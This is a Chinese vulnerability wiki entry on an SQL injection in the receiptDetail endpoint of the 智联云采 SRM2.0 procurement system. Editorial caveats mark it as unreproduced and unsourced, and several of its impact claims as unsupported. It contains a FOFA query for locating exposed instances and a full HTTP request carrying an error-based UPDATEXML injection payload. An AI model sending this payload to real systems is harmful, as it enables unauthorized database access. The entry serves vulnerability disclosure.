---
source: "SourByte05/Vulnerability-Wiki-PoC"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "智联云采 SRM2.0 receiptDetail处 SQL注入漏洞"
product: "智联云采SRM2.0 delivery/receiptDetail"
record_type: "vulnerability"
document_type: "SQL注入接口摘要"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "orderBy表达式MySQL UPDATEXML报错探针，版本/鉴权配置未列"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/%E6%99%BA%E8%81%94/%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87%20SRM2.0%20receiptDetail%E5%A4%84%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
fofa_unverified: "title=="
fofa: "title==\"SRM 2.0\""
id: "vw-6fd9f51b5fc01ef4c5ca4bdb"
entity_id: "ve-6fd9f51b5fc01ef4c5ca4bdb"
schema_version: "1"
---

# 智联云采 SRM2.0 receiptDetail处 SQL注入漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：智联云采SRM2.0 delivery/receiptDetail
- 文献类型：SQL注入接口摘要
- 版本、权限及部署边界：orderBy表达式MySQL UPDATEXML报错探针，版本/鉴权配置未列
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 与quickReceiptDetail样例仅路由差异，属于同族候选，不能未查共享根因即删重
2. 报错探针不支持账号泄露/服务器木马已实现，需限制危害描述；在野状态无证据
3. 版本只智联云采，修复只升级到安全版无边界
4. 补文字响应、厂商来源、orderBy允许列表建议；fofa残缺且未代码围栏

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://github.com/SourByte05/Vulnerability-Wiki-PoC>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

# 漏洞描述

智联云采 SRM2.0receiptDetail接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

智联云采

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title=="SRM 2.0"

POC/EXP：

POST /adpweb/api/srm/delivery/receiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x71707a7671%2C%28SELECT+%28ELT%288058%3D8058%2C1%29%29%29%2C0x71766a7671%29%2C3521%29%29 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

![image-20241121163847276](./.resource/智联云采SRM2.0receiptDetail处SQL注入漏洞/media/image-20241121163847276.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
